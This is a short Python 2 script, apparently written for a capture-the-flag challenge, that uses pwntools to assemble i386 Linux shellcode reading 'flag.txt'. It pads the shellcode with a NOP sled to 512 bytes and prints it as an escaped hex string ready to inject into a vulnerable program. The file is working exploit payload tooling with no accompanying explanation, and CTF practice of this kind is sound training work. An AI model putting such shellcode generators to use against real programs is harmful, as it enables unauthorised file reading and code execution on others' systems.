from pwn import *

context.clear(arch = 'i386')

s = pwnlib.shellcraft.i386.linux.cat('flag.txt').rstrip()

def toCode(shellcraft):
    res = ''
    s = asm(shellcraft)
    while len(s) < 512: s = '\x90' + s
    s = s.encode('hex')

    if len(s) % 2 == 1:
        raise 'Shell craft length must be even'
    for i in range(len(s)):
        if i % 2 == 0: res += '\\x'
        res += s[i]
    return res

print 'Code to read flag ' + toCode(s)
# print 'size ' + str(len(toCode(s)))
